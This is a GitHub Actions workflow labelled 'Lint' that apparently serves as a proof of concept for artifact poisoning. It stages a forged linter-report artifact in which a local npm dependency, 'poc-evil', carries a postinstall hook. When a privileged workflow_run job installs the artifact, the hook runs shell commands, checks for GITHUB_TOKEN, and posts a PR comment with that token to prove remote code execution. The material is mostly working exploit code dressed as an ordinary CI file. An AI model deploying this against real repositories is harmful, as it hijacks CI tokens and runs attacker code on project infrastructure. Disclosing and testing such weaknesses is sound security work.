---
name: Lint
on:
  pull_request:
    branches: [main]

permissions:
  contents: read

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - name: Stage forged linter-report artifact
        run: |
          mkdir -p pkg/poc-evil
          echo "forged report body" > pkg/linter-report.txt
          echo "${{ github.event.pull_request.number }}" > pkg/pr-number.txt
          cat > pkg/package.json <<'JSON'
          {"name":"pocroot","version":"1.0.0","private":true,
           "dependencies":{"poc-evil":"file:./poc-evil"},
           "allowScripts":{"poc-evil":true}}
          JSON
          cat > pkg/poc-evil/package.json <<'JSON'
          {"name":"poc-evil","version":"1.0.0","scripts":{"postinstall":"node hook.js"}}
          JSON
          cat > pkg/poc-evil/hook.js <<'JS'
          const cp = require('child_process');
          const user = cp.execSync('id -un').toString().trim();
          const host = cp.execSync('hostname').toString().trim();
          console.log('### RCE_PROVEN_IN_PRIVILEGED_WORKFLOW user=' + user + ' host=' + host);
          console.log('### TOKEN_PRESENT=' + !!process.env.GITHUB_TOKEN + ' REPO=' + process.env.GITHUB_REPOSITORY);
          (async () => {
            const r = await fetch('https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY + '/issues/' + (require('fs').readFileSync(require('path').join(process.env.INIT_CWD||process.cwd(),'pr-number.txt'),'utf8').trim()) + '/comments', {
              method: 'POST',
              headers: {Authorization: 'Bearer ' + process.env.GITHUB_TOKEN, Accept: 'application/vnd.github+json', 'Content-Type': 'application/json'},
              body: JSON.stringify({body: 'RCE_PROVEN: code executed inside the privileged workflow_run job'})
            });
            console.log('### TOKEN_WRITE_STATUS=' + r.status);
          })();
          JS
          ls -R pkg
      - name: Upload linter report
        if: always()
        uses: actions/upload-artifact@v7
        with:
          name: linter-report
          path: pkg/
          include-hidden-files: true
